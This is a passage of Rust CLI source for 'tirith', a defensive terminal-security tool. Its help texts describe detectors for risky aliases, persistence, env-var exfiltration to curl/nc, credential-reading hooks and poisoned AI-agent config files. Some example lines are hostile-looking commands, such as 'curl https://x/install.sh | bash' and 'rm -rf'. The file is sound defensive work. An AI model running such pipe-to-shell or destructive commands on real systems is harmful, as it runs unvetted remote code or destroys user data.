  ~/.ssh/config Include directive added           — Medium.
  new .envrc appeared                             — Medium.

The snapshot lives at <state-dir>/persistence_snapshot.json (sha256 + size +
content per surface). `scan` records the baseline; `diff` compares against it
without updating it; re-run `scan` to re-baseline. tirith never modifies any
watched file — this is an observability surface.

Examples:
  tirith persistence scan
  tirith persistence scan --json
  tirith persistence diff
  tirith persistence watch --interval 30")]
    Persistence {
        #[command(subcommand)]
        action: PersistenceAction,
    },

    /// Detect risky shell aliases + functions (static-first) (M9 ch3)
    #[command(after_help = "\
Subcommands:
  tirith aliases scan                             — enumerate every alias +
        [--include-runtime] [--json]                function and flag risky ones.
                                                    Exit 1 if any High finding.
  tirith aliases explain <name>                   — show a definition's body +
        [--include-runtime] [--json]                analysis (body redacted).

Two-tier, static-first (safe by construction):
  DEFAULT — a static parser reads ~/.bashrc, ~/.zshrc,
  ~/.config/fish/config.fish, and PowerShell $PROFILE paths directly. It NEVER
  executes your shell config, so inspecting a malicious rc cannot run code.
  --include-runtime (OPT-IN) — additionally shells out with explicit no-rc
  flags (bash --norc --noprofile -c 'alias', zsh -f -c 'alias',
  fish --no-config -c 'functions') so your real rc files are NOT sourced.
  Shells without reliable no-rc support are skipped.

What fires:
  alias/function body makes a network call (curl/wget/nc)   — High.
  alias/function body reads a credential file               — High.
  alias/function shadows a critical command                 — Medium.
        (ls, cd, git, ssh, sudo, npm, pip, docker, kubectl, aws)
  alias defined in an rc file modified within the last hour — Info.

What it is NOT:
  This is an observability surface. tirith never edits your rc files and never
  evaluates them in the default static mode.

Examples:
  tirith aliases scan
  tirith aliases scan --include-runtime
  tirith aliases scan --json
  tirith aliases explain git")]
    Aliases {
        #[command(subcommand)]
        action: AliasesAction,
    },

    /// Monitor sensitive environment-variable lifecycle (M9 ch4)
    #[command(after_help = "\
Subcommands:
  tirith env guard on|off|status                  — flip the exec-path env-guard
        [--json]                                    rules (off by default).
  tirith env diff [--reset]                       — show sensitive vars set /
        [--json]                                    changed since shell start.
                                                    Exit 1 if any newly appeared.
  tirith env explain <VAR>                        — show where a var is set
        [--json]                                    (file:line, value MASKED).

What it protects:
  When `guard` is ON, the exec hot path flags (i) a sensitive env var set while
  a command pipes remote content into a shell (curl|bash), and (ii) printenv/env
  piped into a network sink (curl/nc). The sensitive list is the same one the
  `--suggest-safe-command` env-scrub rewrite uses; extend it via
  policy.env_guard_sensitive_vars.

Value safety (load-bearing):
  tirith NEVER prints, stores, or hashes-recoverably an env value. `explain`
  masks values as ****; the shell-start snapshot stores variable NAMES plus an
  8-char SHA-256 prefix for change-detection only — useless for value recovery.

Examples:
  tirith env guard on
  tirith env diff
  tirith env diff --reset
  tirith env explain AWS_SECRET_ACCESS_KEY")]
    Env {
        #[command(subcommand)]
        action: EnvAction,
    },

    /// Inspect executable provenance — origin, signature, shadowing (M9 ch5)
    #[command(after_help = "\
Subcommands:
  tirith exec check <BIN>        — resolve <BIN> on $PATH, then report its
        [--json]                   package manager, code signature, file type,
                                   permissions, modification time, and whether
                                   it shadows a system command. Exit 1 on a HIGH
                                   finding, 2 if not on $PATH.
  tirith exec provenance <PATH>  — same provenance for a specific file path.
        [--json]                   Exit 1 on a HIGH finding, 2 if not a file.
  tirith exec guard on|off|status  — flip the exec hot-path provenance guard
        [--json]                     (off by default). When ON, the three cheap
                                     leader rules below run on the exec hot path.

What it checks (COLD — never on the exec hot path):
  stat (mtime / mode / owner), `file --brief`, `codesign --verify` (macOS, 2s
  timeout), and package-manager ownership (Homebrew / nix / cargo / rustup /
  user-local). The exec hot path runs only three cheap string-compare rules
  (in /tmp, in repo, writable-PATH-dir-before-system) under
  `tirith exec guard on`.

Examples:
  tirith exec check kubectl
  tirith exec check git --json
  tirith exec provenance /tmp/installer
  tirith exec guard on")]
    Exec {
        #[command(subcommand)]
        action: ExecAction,
    },

    /// Audit $PATH for shadowing / hijack risks (M9 ch5)
    #[command(after_help = "\
Subcommands:
  tirith path audit              — flag repo-local / /tmp / user-writable-
        [--json]                   before-system $PATH dirs and duplicate
                                   command names. Exit 1 on a HIGH finding.
  tirith path watch              — re-audit $PATH every --interval seconds,
        [--interval N] [--json]    printing only when findings change.
  tirith path which <CMD>        — resolve <CMD> across $PATH (first hit wins).
        [--secure] [--json]        With --secure, exit 1 if the resolved copy
                                   is NOT a system binary.

Why under `path`:
  The `which` action lives under the `path` namespace (there is no top-level
  `tirith which`) so all $PATH-shadowing tooling — audit, watch, which — shares
  one command group.

Examples:
  tirith path audit
  tirith path audit --json
  tirith path watch --interval 30
  tirith path which git --secure")]
    Path {
        #[command(subcommand)]
        action: PathAction,
    },

    /// Inventory + guard repo hooks — git / husky / lefthook / CI hooks (M9 ch6)
    #[command(after_help = "\
Subcommands:
  tirith hooks scan              — inventory every hook + automation surface in
        [--json]                   this repo (.git/hooks, .husky, lefthook,
                                   pre-commit, package.json lifecycle scripts,
                                   .envrc, mise/asdf, Makefile/justfile/Taskfile)
                                   and classify each. Exit 1 on a HIGH finding.
  tirith hooks guard on|off|status  — flip the exec-path hook guard (off by
        [--json]                       default). When ON, a hook-triggering
                                       command warns if its triggered hooks make
                                       a network call / read creds / use sudo.
  tirith hooks explain <name>    — show a surface's body (credential-REDACTED)
        [--json]                   + analysis.

Hooks vs automation:
  Hooks (git/husky/lefthook/pre-commit/package.json/.envrc) are auto-executed on
  a lifecycle event — the attack surface the guard watches. Automation
  (Makefile/justfile/Taskfile, mise/asdf) is run by hand and is inventory-only;
  it is NEVER auto-scanned per git/package-manager command.

What the guard checks (HOT — only when `tirith hooks guard on`):
  When the parsed leader is git commit|pull|checkout|merge|rebase|push,
  npm|yarn|pnpm install, or direnv allow|reload, tirith scans ONLY the hook
  types that leader triggers (git commit → pre-commit, NOT pre-push, NOT the
  Makefile) and warns on a network call / credential read / sudo. The scan is
  per-repo mtime-cached for 60s. Hook bodies are read as text, never executed.

Examples:
  tirith hooks scan
  tirith hooks scan --json
  tirith hooks guard on
  tirith hooks explain pre-commit")]
    Hooks {
        #[command(subcommand)]
        action: HooksAction,
    },

    /// Preview the blast radius of a destructive command (M10 ch1)
    #[command(after_help = "\
What this does:
  Simulates the filesystem impact of a destructive command (rm / mv / chmod -R /
  find … -delete / rsync --delete) WITHOUT running it. Walks the target tree
  (depth <= 5, <= 100k files), expands globs against the current directory, and
  reports file / dir / symlink counts, the largest file, whether any target
  escapes the repo, and whether it writes a system path.

What this is NOT:
  - It does NOT execute the command. It only counts impact.
  - It is NOT a sandbox or a security boundary. It reads the disk to count
    impact and then exits.
  - It is the ONLY tirith surface that walks the filesystem. `tirith check`
    NEVER walks the disk — it runs only the cheap string-shape blast-radius
    checks on the hot path.

Globs expand against the current working directory, so the reported counts
reflect the cwd at the time you run the preview.

Exit codes:
  0  no concerns
  1  HIGH impact (system path / outside repo / a $VAR/ glob whose variable is
     set-but-empty)
  2  review recommended (find -delete / rsync --delete / symlinks)

A $VAR/ glob whose variable is merely ABSENT from tirith's environment is
advisory (Info, exit 0): it may be a benign shell-local tirith cannot see.

Examples:
  tirith preview -- \"rm -rf ./dist\"
  tirith preview --json -- \"find . -type f -delete\"
  tirith preview -- \"rsync -a --delete src/ dst/\"")]
    Preview {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// The destructive command to simulate
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },

    /// Run a command and diff its filesystem / $PATH / shell-rc impact (M10 ch2)
    ///
    /// Shortcut for `tirith checkpoint watch` — both dispatch to one impl.
    #[command(after_help = WATCH_AFTER_HELP)]
    Watch {
        /// Extra paths to snapshot for file changes, in addition to the current
        /// directory. Repeat the flag for multiple paths.
        #[arg(long = "paths")]
        paths: Vec<String>,

        /// EXPERIMENTAL, off by default: emit best-effort network hints from a
        /// resolver-cache / log mtime delta. May miss QUIC/UDP/direct-IP
        /// entirely; NOT a network monitor and not a security boundary.
        #[arg(long)]
        with_net_hints: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// The command to run and watch (everything after `--`)
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },

    /// Run a command in a throwaway temp dir and diff its file impact (M10 ch6)
    ///
    /// FILE ISOLATION ONLY — NOT a sandbox. The command runs with your full
    /// privileges (keychain, ssh keys, cloud creds, network). The only thing
    /// changed is the working directory. See `tirith temp-run --help`.
    #[command(after_help = TEMP_RUN_AFTER_HELP)]
    TempRun {
        /// Seed the temp dir with a copy of the current repo, EXCLUDING .git/.
        /// Off by default (the default is an empty temp dir) — copying a large
        /// tree is slow. Pure walkdir + fs::copy; no `cp --exclude`.
        #[arg(long)]
        copy_repo: bool,

        /// Clear the child's environment and re-add only an allowlist (HOME,
        /// PATH, USER, LANG, TERM). A convenience knob, NOT secret scrubbing.
        /// Pure Command::env_clear(); no non-portable `env -i` shell-out.
        #[arg(long)]
        strip_env: bool,

        /// Additionally run the command through the OS containment capsule
        /// (Landlock/seccomp, Seatbelt, or AppContainer), confined to the temp
        /// dir with no network. Best-effort hardening: a host without a working
        /// backend runs the command UNCONTAINED and says so. The JSON envelope
        /// reports the real backend and whether containment was achieved.
        #[arg(long)]
        capsule: bool,

        /// Output the run + file diff as JSON. The envelope carries
        /// `"isolation_kind"` (`file_only_not_a_sandbox`, or `capsule_contained`
        /// when `--capsule` actually contained the run).
        #[arg(long)]
        json: bool,

        /// The command to run in the temp dir (everything after `--`)
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },

    /// Hidden alias for `temp-run` (the spec's `sandbox-dir` word). The
    /// canonical name is `temp-run` to avoid "sandbox" implying a boundary it
    /// does not have; this exists only for discoverability and is identical.
    #[command(name = "sandbox-dir", hide = true, after_help = TEMP_RUN_AFTER_HELP)]
    SandboxDir {
        /// Seed the temp dir with a .git-excluded copy of the repo (off by default).
        #[arg(long)]
        copy_repo: bool,

        /// Clear the child env and re-add only HOME, PATH, USER, LANG, TERM.
        #[arg(long)]
        strip_env: bool,

        /// Additionally run the command through the OS containment capsule,
        /// confined to the temp dir with no network (best-effort; runs
        /// uncontained on a host with no working backend and says so).
        #[arg(long)]
        capsule: bool,

        /// Output JSON (carries `"isolation_kind"`).
        #[arg(long)]
        json: bool,

        /// The command to run in the temp dir (everything after `--`)
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },

    /// Track files downloaded from risky sources (tainted-content) (M10 ch3)
    #[command(after_help = "\
A file becomes tainted when you download-and-keep it from an untrusted source.
The mark is stored in a path-keyed JSONL file at <state-dir>/taint.jsonl. When
a later command executes that exact path (`bash ./install.sh`) or sources it
(`source ./env.sh`), the engine fires ExecOfTaintedFile (High) /
CommandSourcedFromTaintedFile (Medium).

How a file gets tainted:
  tirith fetch --save ./install.sh https://untrusted.example/install.sh

Limitations:
  The store is PATH-KEYED — `mv ./install.sh ./run.sh` loses the mark. The mark
  is NEVER auto-cleared by `chmod +x` or a `bash -n` parse check; only an
  explicit `tirith taint clear` removes it.

Examples:
  tirith taint list
  tirith taint list --json
  tirith taint explain ./install.sh
  tirith taint clear ./install.sh
  tirith taint clear ./install.sh --yes")]
    Taint {
        #[command(subcommand)]
        action: TaintAction,
    },

    /// Flag mismatches between a stated intent and what a command does (M10 ch4)
    #[command(after_help = "\
A pure-Rust, no-LLM heuristic: you state what you MEANT to do (\"install a
formatter\"), tirith analyzes the command with the SHIPPING engine rules, and it
flags any HIGH-IMPACT behavior the stated intent does not justify — e.g. piping
a remote script into a shell when you only said you wanted to install a tool.

The command signals come from the same rules as `tirith check` (download-pipe,
sudo, credential/data exfil, shell-rc write, base64-execute, package install),
so they stay consistent with the rest of tirith. The intent is classified by
whole-word keyword match (install / download / run / test / build / format /
clean / deploy / configure).

What this is NOT:
  - It is ADVISORY and Info-level. It NEVER blocks. The command's real security
    verdict comes from `tirith check`; `intend` only answers \"does what you said
    match what this does?\".
  - It is a HEURISTIC. An intent phrasing it doesn't recognize yields no intent
    signals, so every high-impact behavior then reads as unjustified — the
    output says so plainly.
  - There is NO LLM call. A future `--llm-explain` wave may add one; M10 is pure
    heuristic.

--explain shows the per-signal derivation: which intent keywords matched, which
command signals fired, and which pairing produced each mismatch. Under --json it
adds a `derivation: [...]` array.

Exit codes (deliberately distinct from `tirith check`):
  0  no mismatch (behavior justified, or no high-impact behavior)
  1  at least one mismatch flagged (NOT a security block — review the command)
  2  usage error (empty intent or empty command)

`tirith check` uses 0/1/2/3 tied to verdict severity; `intend`'s codes are tied
to whether a mismatch was found.

Examples:
  tirith intend \"install a formatter\" -- \"curl https://x/install.sh | bash\"
  tirith intend --explain \"install a formatter\" -- \"curl https://x/install.sh | bash\"
  tirith intend \"download and run an installer\" -- \"curl https://x/install.sh | bash\"
  tirith intend --json \"run the tests\" -- \"cargo test\"")]
    Intend {
        /// What you intended to do, in plain language (e.g. "install a formatter")
        intent: String,

        /// Show the per-signal derivation: which intent keywords matched, which
        /// command signals fired, and which pairing caused each mismatch. Under
        /// --json this adds a `derivation: [...]` array.
        #[arg(long)]
        explain: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// The command to analyze (everything after `--`)
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },

    /// Opt-in per-user anomaly baseline: learn|status|reset (M10 ch5)
    #[command(after_help = "\
An OPT-IN sliding-window anomaly detector (default OFF — design-decision D2).
When enabled, tirith records a privacy-hashed observation every time a detection
rule fires and, for a pattern that is NEW or RARE for you, surfaces an extra
Info-severity note alongside the normal verdict. The note NEVER blocks — it
answers \"have I done this before?\", not \"is this dangerous?\".

Privacy by design: the store records NO raw hostnames and NO raw paths. Hosts
and the repo root are salted-sha256 hashed (per-install salt at
<state-dir>/baseline.salt, mode 0600); ecosystem and the sudo flag are
low-cardinality categoricals. The tuple is
(rule_id, host-hash, ecosystem, sudo, cwd/repo-hash). The store lives at
<state-dir>/baseline.jsonl, a 90-day window capped at 100k entries.

Early-baseline mode: until the window holds ~30 observations, everything looks
new — anomaly signals are not yet meaningful. `tirith doctor` and
`tirith baseline status` say so.

Subcommands:
  learn   turn the baseline ON (sets policy.baseline_enabled = true)
  status  show the top 20 patterns (privacy-hashed) + the enabled flag
  reset   zero the store (prompts unless --yes)

Examples:
  tirith baseline learn
  tirith baseline status
  tirith baseline status --json
  tirith baseline reset
  tirith baseline reset --yes")]
    Baseline {
        #[command(subcommand)]
        action: BaselineAction,
    },

    /// Create, sign, and verify signed command cards (M11 ch1)
    // Help text is platform-split: `fetch` is `#[cfg(unix)]`, so the Windows
    // help must not advertise a subcommand that does not exist there.
    #[cfg_attr(
        unix,
        command(after_help = "\
A command card is an ed25519-signed attestation of what a command DOES: the
exact command string, the domains it should contact, the SHA-256 of any script
it pipes, the paths it writes, whether it needs sudo, and an expiry date. A
maintainer publishes a card next to their install one-liner; a user verifies
the card against the command they are about to run.

v1 is ATTESTATION-ONLY. A verified card emits an Info `command_card_verified`
finding that improves audit confidence but does NOT change the verdict — a
`curl … | sh` with a valid card still warns/blocks exactly as it would without
one. A command that differs from its trusted card emits a High
`command_card_mismatch` (a tampering signal). There is no card-driven
suppression in v1.

TRUST (manual in v1): card signatures verify against ed25519 public keys you
have explicitly trusted by dropping `<key_id>.pub` into the `trusted-card-keys/`
directory under tirith's config dir (`~/.config/tirith/` on Linux; the platform
config dir on macOS/Windows). A card signed by a key not in that directory is
treated as unverified.

NO HOT-PATH NETWORK: `tirith check` NEVER fetches a card. A `# tirith-card:`
comment value or `--card` argument may be a local path OR a URL — but a URL is
NOT fetched on the hot path; it surfaces a 'download this card first' hint
(Info `command_card_unverified`) and is otherwise treated as if no card were
present. To actually verify a card hosted at a URL, run
`tirith command-card fetch <url>` first (the only remote-I/O path), then pass
the cached local path to `tirith check --card`.

PRIVACY: `tirith command-card fetch <url>` reveals to the maintainer's domain
that a tirith user is pulling their card (your IP + a timestamp). This is
inherent to an explicit fetch.

Subcommands:
  create  build an unsigned card from flags (or prompts) and print JSON
  sign    sign a card in place with an ed25519 private key
  verify  verify a card against your trusted-card-keys directory
  fetch   download a card from a URL into tirith's cache dir (cards/<sha256>.json)

Examples:
  tirith command-card create --command 'curl -fsSL https://example.com/install.sh | sh' \\
    --expected-domain example.com --writes /usr/local/bin/example > install-card.json
  tirith command-card sign --key ed25519-priv.bin install-card.json
  tirith command-card verify install-card.json
  tirith command-card fetch https://example.com/install-card.json")
    )]
    #[cfg_attr(
        not(unix),
        command(after_help = "\
A command card is an ed25519-signed attestation of what a command DOES: the
exact command string, the domains it should contact, the SHA-256 of any script
it pipes, the paths it writes, whether it needs sudo, and an expiry date. A
maintainer publishes a card next to their install one-liner; a user verifies
the card against the command they are about to run.

v1 is ATTESTATION-ONLY. A verified card emits an Info `command_card_verified`
finding that improves audit confidence but does NOT change the verdict — a
`curl … | sh` with a valid card still warns/blocks exactly as it would without
one. A command that differs from its trusted card emits a High
`command_card_mismatch` (a tampering signal). There is no card-driven
suppression in v1.

TRUST (manual in v1): card signatures verify against ed25519 public keys you
have explicitly trusted by dropping `<key_id>.pub` into the `trusted-card-keys/`
directory under tirith's config dir (`~/.config/tirith/` on Linux; the platform
config dir on macOS/Windows). A card signed by a key not in that directory is
treated as unverified.

NO HOT-PATH NETWORK: `tirith check` NEVER fetches a card. A `# tirith-card:`
comment value or `--card` argument may be a local path OR a URL — but a URL is
NOT fetched on the hot path; it surfaces a 'download this card first' hint
(Info `command_card_unverified`) and is otherwise treated as if no card were
present. To actually verify a card hosted at a URL, download it to a local file
first (e.g. with your browser or a download tool), then pass that path to
`tirith check --card`. The automated `command-card fetch` downloader is not
available on this platform.

Subcommands:
  create  build an unsigned card from flags (or prompts) and print JSON
  sign    sign a card in place with an ed25519 private key
  verify  verify a card against your trusted-card-keys directory

Examples:
  tirith command-card create --command 'curl -fsSL https://example.com/install.sh | sh' \\
    --expected-domain example.com --writes /usr/local/bin/example > install-card.json
  tirith command-card sign --key ed25519-priv.bin install-card.json
  tirith command-card verify install-card.json")
    )]
    CommandCard {
        #[command(subcommand)]
        action: CommandCardAction,
    },

    /// Manage the repo command manifest (.tirith/commands.yaml) (M11 ch2)
    #[command(
        name = "commands",
        after_help = "\
A repo command manifest (.tirith/commands.yaml) is a SUPPRESSION-BOUNDED
allowlist of expected repo commands. It can do exactly two things, and NOTHING
else:

  allowed[]   an exact-match catalogue of expected commands. Listing a command
              here suppresses ONLY the informational `repo_command_unknown`
              note for that exact command. It NEVER weakens a real finding: a
              command the engine flags High/Critical (e.g. `curl ... | bash`)
              STILL BLOCKS even if it is listed under allowed[].
  dangerous[] glob patterns (only `*` is supported in v1) that, when matched,
              ADD a blocking `repo_command_dangerous_pattern` finding,
              regardless of what the engine found. Use this to make a repo
              STRICTER. `dangerous` wins over `allowed` — you cannot allow-list
              your way out of a dangerous pattern.

Subcommands:
  init    write a starter .tirith/commands.yaml (refuses to overwrite without --force)
  list    print the catalogued allowed[] / dangerous[] entries
  run     run an allowed[] command by name (re-checked through the engine first)
  check   evaluate an arbitrary command against the manifest + engine

Examples:
  tirith commands init
  tirith commands list
  tirith commands run test
  tirith commands check -- \"npm run build\"
  tirith commands check -- \"curl https://example.com/install.sh | bash\""
    )]
    RepoCmd {
        #[command(subcommand)]
        action: RepoCommandsAction,
    },

    /// AI-config drift + risk surface for an agent's repo
    #[command(after_help = "\
`tirith ai` watches the AI-config surface a coding agent reads and acts on —
CLAUDE.md, AGENTS.md, .cursorrules, .claude/*, .cursor/rules/*, .mcp.json — for
drift and risk. It runs the AI-config subset of the shipping scan engine and
diffs the current tree against a last-known-safe snapshot.

Subcommands:
  scan                  run the `ai-agent-repo` scan profile over the repo's
                        AI-config files (reuses `tirith scan`; no new engine)
  diff                  compare each AI-config file to the snapshot at
                        <state-dir>/ai_config_snapshot.json and report added /
                        removed instructions + any AiConfig* findings
  quarantine <file>     COPY a (suspected-poisoned) config into
                        <cache-dir>/tirith/quarantine/ — the ORIGINAL IS UNTOUCHED
                        by default; --move opts into deleting the original
                        (prompts unless --yes)
  explain-config <file> identify which AI tool a config configures (CLAUDE.md →
                        Claude, .cursorrules/.cursor → Cursor, AGENTS.md →
                        generic, .mcp.json → MCP) and what it grants
  snapshot [--update]   show the snapshot state, or (--update) re-scan + record
                        a fresh snapshot (refuses to bless a High+ state unless
                        --force)

Two diff-only rules can fire from `tirith ai diff` (never the exec/scan hot
path): ai_config_hidden_instruction_added and ai_config_tool_use_escalation,
both High. They reuse the shipping hidden-content detection and NORMALIZE both
sides before diffing, so a pure Markdown reformat is not a finding.

Examples:
  tirith ai scan
  tirith ai diff
  tirith ai diff --json
  tirith ai quarantine .cursorrules
  tirith ai quarantine .cursorrules --move --yes
  tirith ai explain-config CLAUDE.md
  tirith ai snapshot
  tirith ai snapshot --update")]
    Ai {
        #[command(subcommand)]
        action: AiAction,
    },

    /// Plant honeytoken / canary tokens (local-first, opt-in callback) (M11 ch3)
    #[command(after_help = "\
A canary is a deliberately-synthetic, clearly-fake secret-shaped token you plant
as BAIT where it should never be read — a decoy ~/.aws/credentials, a fake .env,
a bait line in a private repo. tirith records it in a local-first store at
<state-dir>/canaries.jsonl. When that EXACT token later shows up in a command
you run, a paste, or a tool output tirith inspects, the engine fires
CanaryTokenTouched (High) — a strong 'someone touched the decoy' signal.

Detection is a STORE lookup, NOT a shape match: ONLY tokens you registered fire.
An unrelated, genuine AWS key in a paste fires the existing credential rules, not
the canary rule.

Clearly-synthetic shapes (see docs/canary-formats.md):
  aws-like            AKIA00CANARY... (the 00CANARY infix is invalid for a real
                      AWS key — 0 is not in the base32 alphabet)
  github-like         ghp_canary_...
  gcp-like            AIzaCANARY...
  env-line            TIRITH_CANARY_TOKEN=canary_...
  private-key-shaped  a PEM block with a TIRITHCANARY marker
These can never be mistaken for a real third-party credential, so they cannot
trigger an external provider's abuse / take-down workflow.

D3 — local-first, no phone-home:
  By DEFAULT a canary is local-only: detection raises a finding and writes to
  the local audit log; nothing leaves the machine. `create --callback-url <url>`
  opts into a best-effort POST of {kind, detected_at, context} (NEVER the token
  value) to a URL YOU self-host. There is no tirith-operated endpoint. A callback
  failure is logged to the audit log and never blocks the verdict — it is the
  single exception to tirith's no-network rule, gated entirely behind your URL.

Subcommands:
  create <kind> [--callback-url <url>]  generate + store a fresh canary token
  status                                summary (count, callbacks, store path)
  list                                  every registered canary (with token)
  prune <id>                            remove one canary (prompts unless --yes)
  rotate <id>                           fresh token, same id + callback

Examples:
  tirith canary create aws-like
  tirith canary create github-like --callback-url https://my-host.example/hit
  tirith canary status
  tirith canary list --json
  tirith canary rotate a1b2c3d4e5f6
  tirith canary prune a1b2c3d4e5f6 --yes")]
    Canary {
        #[command(subcommand)]
        action: CanaryAction,
    },

    /// Secret-rotation ASSISTANT: where + how to rotate a leak (M11 ch4)
    #[command(after_help = "\
tirith does NOT perform rotation or revocation; it shows you where and how.
YOU do the rotation. This is a guidance-only assistant.

It makes ZERO network calls — the revocation and doc URLs it prints are inert
strings for you to open yourself. No HTTP client is ever constructed.

Subcommands:
  triage                  scan RECENT credential findings in the local audit
                          log and print a one-line rotation next-step for each
  rotate <provider>       show a provider's revocation URL, docs, and the
                          manual checklist you perform
  revoke --provider <p>   same data, leading with the revocation URL

Providers (11): aws, github, npm, pypi, cargo, stripe, slack, openai,
anthropic, gcp, azure.

triage reads credential-type findings already recorded by the engine
(credential_in_text, high_entropy_secret, private_key_exposed,
canary_token_touched, and the threat-DB package rules) — it adds no new
detection and no new rule IDs. It only ever sees the engine's REDACTED command
text, never raw secret values.

Guidance staleness: each provider entry carries a last_verified date, shown
under --verbose, so a stale entry is visible rather than silently trusted.

Examples:
  tirith secret triage
  tirith secret triage --json
  tirith secret rotate github
  tirith secret rotate github --verbose
  tirith secret revoke --provider aws")]
    Secret {
        #[command(subcommand)]
        action: SecretAction,
    },

    /// Incident mode: fail-closed + elevate rules until you stop it (M11 ch5)
    #[command(after_help = "\
Incident mode is a manually-declared 'we may be under attack' posture. While it
is active tirith stops being advisory and turns the screws:

  * the runtime policy is forced FAIL-CLOSED;
  * the TIRITH=0 env bypass is DISABLED (interactive AND non-interactive);
  * a curated set of ALREADY-SHIPPING rules is elevated (credential_file_sweep,
    base64_decode_execute, exec_recently_modified, exec_world_writable).

It adds NO new rule IDs — it only re-weights existing detection.

Subcommands:
  start [--reason \"…\"]   declare an incident (errors if one is already active)
  stop                    end the incident (prompts unless --yes); ALWAYS works
  status                  show active/inactive + reason + started_at
  report [--out <path>]   write a markdown incident report

LOCKOUT SAFETY: `incident stop` is a direct state-file deletion — it is NOT
gated by the incident's own fail-closed policy, so a stuck incident is always
recoverable even with the bypass disabled.

Report privacy: the report embeds only the audit log's already-REDACTED command
text; full commands are never reconstructed.

Examples:
  tirith incident start --reason \"suspicious paste\"
  tirith incident status
  tirith incident report --out incident-2026-05-28.md
  tirith incident stop --yes")]
    Incident {
        #[command(subcommand)]
        action: IncidentAction,
    },

    /// Audit how well YOUR terminal + font tells confusable glyphs apart (M12 ch2)
    #[command(after_help = "\
Renders pairs of visually-confusable glyphs (Latin vs Cyrillic / Greek, fullwidth
forms, math-alphanumeric letters, a zero-width space, a right-to-left override)
and asks whether you can tell each pair apart IN YOUR TERMINAL AND FONT.

The result is INHERENTLY LOCAL: whether two glyphs look identical depends on your
terminal emulator + font + rendering stack, so the recorded answer describes only
THIS machine and is not portable. tirith's homograph / confusable detection fires
regardless of how your terminal renders these — this audit measures the other
half: your own ability to notice an attack visually.

Results are saved to config_dir()/visual-audit-result.json:
  {audited_at, terminal: <$TERM>, pairs_total, distinguishable,
   indistinguishable, skipped, results: [{name, codepoints, verdict}]}

Flags:
  --non-interactive   never prompt (CI-safe); records every pair as skipped, exit 0
  --pairs critical     the high-signal subset (default)
  --pairs all          every pair
  --json               also emit the result as JSON on stdout

Interactive prompting requires a TTY on stdin. A non-TTY run without
--non-interactive prints a note and exits 0 (it does not block on a read).

Examples:
  tirith visual-audit
  tirith visual-audit --pairs all
  tirith visual-audit --non-interactive --pairs critical
  tirith visual-audit --json")]
    VisualAudit {
        /// Skip all prompting (CI-safe); record every selected pair as skipped.
        #[arg(long)]
        non_interactive: bool,
        /// Pair subset: `critical` (default) or `all`.
        #[arg(long)]
        pairs: Option<String>,
        /// Also emit the result as JSON on stdout.
        #[arg(long)]
        json: bool,
    },

    /// Browser companion: native-messaging host + extension manifest install (M12 ch3)
    #[command(after_help = "\
tirith pairs with a companion browser extension (shipped from a SEPARATE repo)
that records where clipboard content was copied from, so the `paste_source_mismatch`
rule can flag a paste whose source host differs from where the command runs.

Subcommands:
  host                native-messaging host. Chrome spawns this; it reads
                      length-prefixed JSON frames on stdin, validates each
                      against the clipboard-source schema, and writes
                      state-dir/clipboard_source.json atomically. Untrusted
                      input: frames are size-capped (256 KiB) and schema-checked
                      before any write. Not meant to be run by hand.
  install-extension   write the per-OS Chrome Native Messaging Host manifest
                      (sh.tirith.browser.json) so the extension can launch the
                      host. Dry-run by default (prints the manifest + path);
                      --apply writes it. Windows uses a registry key — guidance
                      is printed there rather than writing the registry.

Because the extension is not yet published its Chrome id is unknown; pass
--extension-id <id> or a clearly-marked placeholder is used.

Examples:
  tirith browser install-extension
  tirith browser install-extension --apply
  tirith browser install-extension --extension-id abcdefghijklmnopabcdefghijklmnop --apply
  tirith browser install-extension --json")]
    Browser {
        #[command(subcommand)]
        action: BrowserAction,
    },
}

#[derive(Subcommand)]
enum DashboardAction {
    /// Write the HTML security report to a file
    #[command(after_help = "\
Default output is <documents-dir>/tirith-dashboard-<date>.html (<documents-dir> is
your Documents folder, resolved per-OS). `--out .` writes ./dashboard.html;
`--out <dir>` writes <dir>/dashboard.html; any other `--out` value is the exact
file path. On Unix the file is created 0600. `--json` prints a small
machine-readable result (path written, byte count, and the snapshot).

Examples:
  tirith dashboard export
  tirith dashboard export --out .
  tirith dashboard export --out /tmp/sec.html
  tirith dashboard export --json")]
    Export {
        /// Output path. Omit for <documents-dir>/tirith-dashboard-<date>.html
        /// (your Documents folder, resolved per-OS); `.` or a directory writes
        /// dashboard.html there; else the exact file.
        #[arg(long)]
        out: Option<String>,
        /// Emit a machine-readable result (path, bytes, snapshot) as JSON.
        #[arg(long)]
        json: bool,
    },

    /// Serve the report on a loopback-only HTTP server with an ephemeral token
    #[command(after_help = "\
Binds 127.0.0.1 ONLY (never 0.0.0.0). With no --port an OS ephemeral port is
chosen and read back. Prints http://127.0.0.1:<port>/?token=<token>; the token is
random, in-memory only (never written to disk), and expires after 1 hour.

A request whose Host header is not a loopback host is refused 403 (DNS-rebinding
guard); a missing, wrong, or expired token gets 401. Serves until Ctrl-C.

Examples:
  tirith dashboard serve
  tirith dashboard serve --port 8765
  tirith dashboard serve --json")]
    Serve {
        /// TCP port to bind on 127.0.0.1. Omit for an OS-assigned ephemeral port.
        #[arg(long)]
        port: Option<u16>,
        /// Emit the loopback URL + token as JSON instead of human text.
        #[arg(long)]
        json: bool,
    },
}

#[derive(Subcommand)]
enum BrowserAction {
    /// Run the Chrome native-messaging host (spawned by the extension, not by hand)
    ///
    /// Hidden from the top-level `--help` listing — Chrome's native-messaging
    /// layer invokes this with stdin/stdout wired to the extension. It reads
    /// 4-byte-length-prefixed UTF-8 JSON frames, validates each against the
    /// clipboard-source schema, and writes `state-dir/clipboard_source.json`
    /// atomically. Incoming frames are capped at 256 KiB.
